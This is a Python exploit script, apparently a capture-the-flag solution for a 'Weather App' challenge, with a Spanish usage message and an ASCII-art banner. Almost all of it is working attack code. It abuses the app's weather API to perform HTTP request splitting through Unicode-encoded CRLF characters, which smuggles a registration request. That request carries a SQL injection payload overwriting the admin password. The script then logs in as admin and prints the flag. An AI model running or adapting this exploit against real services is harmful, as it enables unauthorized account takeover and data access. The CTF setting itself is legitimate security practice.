import requests, argparse

BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'

parse = argparse.ArgumentParser("[+] Usage: weatherappHTB.py -u http://machineIP")
parse.add_argument('-u', '--url', help="Ingrese la ip de la maquina, sin la barra final. Ejemplo: http://example.com")
parse = parse.parse_args()

if parse.url:

    banner = """
      ⠸⣿⣿⢣⢶⣟⣿⣖⣿⣷⣻⣮⡿⣽⣿⣻⣖⣶⣤⣭⡉       _ _ _ _____ _____ _____ _____ _____ _____  
       ⢹⠣⣛⣣⣭⣭⣭⣁⡛⠻⢽⣿⣿⣿⣿⢻⣿⣿⣿⣽⡧⡄    | | | |   __|  _  |_   _|  |  |   __| __  |
        ⣼⣿⣿⣿⣿⣿⣿⣿⣿⣶⣌⡛⢿⣽⢘⣿⣷⣿⡻⠏⣛⣀   | | | |   __|     | | | |     |   __|    -|
       ⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠙⡅⣿⠚⣡⣴⣿⣿⣿⡆  |_____|_____|__|__| |_| |__|__|_____|__|__|
      ⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠄⣱⣾⣿⣿⣿⣿⣿⣿   _____ _____ _____    _____ _____ _____    
     ⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿  |  _  |  _  |  _  |  |  |  |_   _| __  |  
     ⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠣⣿⣿⣿⣿⣿⣿⣿⣿⣿  |     |   __|   __|  |     | | | | __ -|  
     ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠑⣿⣮⣝⣛⠿⠿⣿⣿⣿⣿  |__|__|__|  |__|     |__|__| |_| |_____|  
    ⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟   BY: ALCATRAZ2033 and SOMEONE ELSE                                       
    ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇    ⢹⣿⣿⣿⣿⣿⣿⣿⣿⠁
    ⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏      ⠸⣿⣿⣿⣿⣿⡿⢟⣣
    """

    url = parse.url
    username = "admin"
    password = "1337') ON CONFLICT(username) DO UPDATE SET password ='admin';--"
    parsedUsername = username.replace(" ", "\u0120").replace("'", "%27").replace('"',"%22")
    parsedPassword = password.replace(" ", "\u0120").replace("'", "%27").replace('"',"%22")
    contentLength = len(parsedUsername) + len(parsedPassword) + 19

    endpoint = '127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\ u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120'+ str(contentLength) +'\u010D\u010A\u010D\u010Ausername=' + parsedUsername +'&password=' + parsedPassword+'\u010D\u010A\u010D\u010AGET\u0120/?lol='

    r = requests.post(url +'/api/weather', json={'endpoint': endpoint,'city':'Quito','country':'EC'})

    flag = requests.session()
    urlLogin = url + '/login'
    data = {
        'username' : 'admin',
        'password' : 'admin'
    }

    flag = flag.post(urlLogin, data=data)
    print(CYAN + banner)
    print( GREEN + "\n  [*] FLAG: " + RESET , flag.text)
else:
    print( RED + "[!] No ha ingresado ninguna url\n[!] Usa el parametro -h para ver el help pannel" + RESET)
